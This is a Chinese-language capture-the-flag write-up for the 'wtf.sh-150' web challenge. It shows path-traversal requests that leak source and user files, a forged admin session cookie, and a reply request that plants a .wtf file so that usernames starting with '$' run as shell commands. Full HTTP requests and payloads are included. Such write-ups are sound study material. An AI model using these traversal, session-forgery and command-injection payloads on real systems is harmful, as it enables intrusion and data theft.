## wtf.sh-150

网站使用.wtf的奇怪后缀文件名写的

```
/post.wtf?post=nBp9N
```

有传参，fuzz一下

存在路径穿透

```
poc=/post.wtf?post=../
```

可以看到有源码泄露

太多了，CRTL+F直接看看有没有flag

```shell
source user_functions.sh
<html>
	<head> 
	<link rel="stylesheet" type="text/css" href="/css/std.css" >
    </head> 
    $ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}" $ then $ local username=$(head -n 1 users/${URL_PARAMS['user']});
    $ echo "<h3>${username}'s posts:</h3>";
    $ echo "<ol>"; $ get_users_posts "${username}" | while read -r post;
    do $ post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
    $ echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</a></li>";
    $ done $ echo "</ol>";
    $ if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]] $ then $ get_flag1 $ fi $ fi 
 </html>
```

可以看到如果我们获得了admin的登录态，就会拿到flag1

那么我们搜一下user相关源码看看

```shell
cp -R /opt/wtf.sh /tmp/wtf_runtime; # 
protect our stuff chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.wtf;
chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.sh;
chmod 777 /tmp/wtf_runtime/wtf.sh/; 
# set all dirs we could want to write into to be owned by www 
# (We don't do whole webroot since we want the people to be able to create # files in webroot, but not overwrite existing files) 
chmod -R 777 /tmp/wtf_runtime/wtf.sh/posts/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/posts/;
chmod -R 777 /tmp/wtf_runtime/wtf.sh/users/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/users/;
chmod -R 777 /tmp/wtf_runtime/wtf.sh/users_lookup/;
chown -R www:www /tmp/wtf_runtime/wtf.sh/users_lookup/; # let's get this party started! 
su www -c "/tmp/wtf_runtime/wtf.sh/wtf.sh 8000";
```

可以看到，存在users/ users_lookup/文件夹，利用路径穿透读一下

返回了

```
Posted by admin
ae475a820a6b5ade1d2e8b427b59d53d15f1f715
uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
```

结合之前泄露的源码

```shell
function hash_password {
	local password=$1;
    (shasum <<< ${password}) | cut -d\ -f1; 
}
# hash usernames for lookup in the users_lookup table 
function hash_username {
	local username=$1;
	(shasum <<< ${username}) | cut -d\ -f1; 
}
# generate a random token, base64 encoded 
# on GNU base64 wraps at 76 characters, so we need to pass --wrap=0 
function generate_token {
	(head -c 64 | (base64 --wrap=0 || base64)) < /dev/urandom 2> /dev/null;
} 
function find_user_file { 
	local username=$1;
	local hashed=$(hash_username "${username}"); 
	local f;
	if [[ -n "${username}" && -e "users_lookup/${hashed}" ]] then echo "users/$(cat "users_lookup/${hashed}/userid")";
    else echo "NONE";
    # our failure case -- ugly but w/e... 
    fi;
    return;
} 
# The caller is responsible for checking that the user doesn't exist already calling this 
function create_user {
	local username=$1;
	local password=$2;
	local hashed_pass=$(hash_password ${password}); 
	local hashed_username=$(hash_username "${username}"); 
	local token=$(generate_token); 
	mkdir users 2> /dev/null; 
	# make sure users directory exists 
	touch users/.nolist;
	# make sure that the users dir can't be listed 
	touch users/.noread; 
	# don't allow reading of user files directly 
	mkdir users_lookup 2> /dev/null; 
	# make sure the username -> userid lookup directory exists 
    touch users_lookup/.nolist; # don't let it be listed 
    local user_id=$(basename $(mktemp users/XXXXX)); 
    # user files look like: # username # hashed_pass # token 
    echo "${username}" > "users/${user_id}";
    echo "${hashed_pass}" >> "users/${user_id}";
    echo "${token}" >> "users/${user_id}";
    mkdir "users_lookup/${hashed_username}" 2> /dev/null;
    touch "users_lookup/${hashed_username}/.nolist";
    # lookup dir for this user can't be readable 
    touch "users_lookup/${hashed_username}/.noread";
    # don't allow reading the lookup dir 
    touch "users_lookup/${hashed_username}/posts"; 
    # lookup for posts this user has participated in 
    echo "${user_id}" > "users_lookup/${hashed_username}/userid";
    # create reverse lookup 
    echo ${user_id};
} 
function check_password {
	local username=$1;
	local password=$2;
	local userfile=$(find_user_file ${username}); 
	if [[ ${userfile} = 'NONE' ]] then return 1; fi 
	local hashed_pass=$(hash_password ${password});
	local correct_hash=$(head -n2 ${userfile} | tail -n1);
	[[ ${hashed_pass} = ${correct_hash} ]];
    return $?;
} 
function is_logged_in {
	contains 'TOKEN' ${!COOKIES[@]} && contains 'USERNAME' ${!COOKIES[@]}; 
	local has_cookies=$?; 
	local userfile=$(find_user_file ${COOKIES['USERNAME']});
    [[ ${has_cookies} \ && ${userfile} != 'NONE' \ && $(tail -n1 ${userfile} 2>/dev/null) = ${COOKIES['TOKEN']} \ && $(head -n1 ${userfile} 2>/dev/null) = ${COOKIES['USERNAME']} \ ]];
    return $?;
} 
function get_users_posts { 
    local username=$1;
    local hashed=$(hash_username "${username}"); 
    # we only have to iterate over posts a user has replied to 
    while read -r post_id; 
    do echo "posts/${post_id}";
    done < "users_lookup/${hashed}/posts"; 
}
```

应该就是admin的# username # hashed_pass # token 

根据 is_logged_in的逻辑，把cookie里面的token和username替换掉就可以了

用burp抓包修改之

```html
GET /profile.wtf?user=jlvfK HTTP/1.1
Host: 111.198.29.45:52494
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
Connection: close

HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: wtf.sh 0.0.0.0.1 "alphaest of bets"
X-Bash-Fact: Loops are just commands. So, you can pipe things into and out of them!
```

注意这里的user参数是通过访问admin的个人页面拿到的

```
Flag: xctf{cb49256d1ab48803
```

拿到了flag的一半，

另一半在哪呢，再对源码进行审计

考虑到create_user()里我们往服务器上写了一个文件，并且其中用户名一段是可控的，假如我们可以在这里注入恶意代码并解析成功，说不定就能getshell啥的

搜一下include

```sh
function include_page {
    # include_page <pathname> 
    local pathname=$1 
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1)) 
    if [[ $page_include_depth -lt $max_page_include_depth ]] then
        local line;
        while read -r line; do 
        # check if we're in a script line or not ($ at the beginning implies script line) 
        # also, our extension needs to be .wtf 
        [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
        is_script=$?;
        # execute the line. 
        if [[ $is_script = 0 ]] then
            cmd+=$'\n'"${line#"$"}";
        else if [[ -n $cmd ]] then
            eval "$cmd" || log "Error during execution of ${cmd}";
            cmd="" 
            fi 
        echo $line 
        fi 
        done < ${pathname} else echo "<p>Max include depth exceeded!<p>" 
    fi 
} 
```

（格式化这东西还真是费劲。。。。

也就是说，他只会解析.wtf为后缀的并且前缀为$的文件，之前那个存用户信息的文件是不行了。。。。

还有什么地方可以自己注信息到服务器上呢，

看看post和reply这两个地方

```shell
function reply { 
	local post_id=$1;
	local username=$2; 
	local text=$3; 
	local hashed=$(hash_username "${username}"); 
	curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); 
	next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}"); 
	next_file=(posts/${post_id}/${next_reply_id}); 
	echo "${username}" > "${next_file}"; 
	echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}"; 
	echo "${text}" >> "${next_file}";
	# add post this is in reply to to posts cache 
	echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts"; 
}
```

这里的next_file文件后缀是可控的，```next_file=(posts/${post_id}/${next_reply_id}); ```

我们只需要修改post_id就可以了,而post_id是存在路径穿越的，所以可以构造

```
POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1
Host: 111.198.29.45:52494
Content-Length: 20
Cache-Control: max-age=0
Origin: http://111.198.29.45:52494
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: USERNAME=eki; TOKEN=S7m+g2qcq8KjmzxWw18y2y+oe+Af+vL9Z3ezUFkCQgD8fFDykwwHrRxe/KJblUe3wc3VlgVcbpne4sf7fyHeRg==
Connection: close

text=124&submit=true
```

为什么是/users_lookup/因为fuzz后发现这个目录下没有.noread，所以可以放后门文件并被解析

提交后发现

```
/users_lookup/eval.wtf
```

可以访问了

现在我们只要注册一个$开头的用户名，就可任意执行脚本了

比如${find,/,-iname,flag}

```
POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1
Host: 111.198.29.45:52494
Content-Length: 19
Cache-Control: max-age=0
Origin: http://111.198.29.45:52494
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: USERNAME=${find,/,-iname,*flag*}; TOKEN=JlsevcdXD47AijOfmE2zFRoBilmKOfrvpMQ31UqcHk79Zdn3enB+jlJx/GGEquu010Pm9IwjccE7G1lKPRzYUw==
Connection: close

text=123421&submit=
```

找到了

```
/usr/bin/get_flag2
```

和get_flag1一样执行一下

```
POST /reply.wtf?post=../users_lookup/eval.wtf%09 HTTP/1.1
Host: 111.198.29.45:52494
Content-Length: 16
Cache-Control: max-age=0
Origin: http://111.198.29.45:52494
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:52494/reply.wtf?post=K8laH
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: USERNAME=$/usr/bin/get_flag2; TOKEN=05GPW8uS2zpg1hCjm1nTcGQ0at/zDT6V4rGHCN7TFn/NeNv3ZqIge4FHJ7QJC4dpNj6hNsdQdZYyizJq2UPP5g==
Connection: close

text=233&submit=
```

拿到后半部分

```
Flag: 149e5ec49d3c29ca}
```

### 参考资料

bash中各种符号命令的解释：https://www.cnblogs.com/lsgxeva/p/11024165.html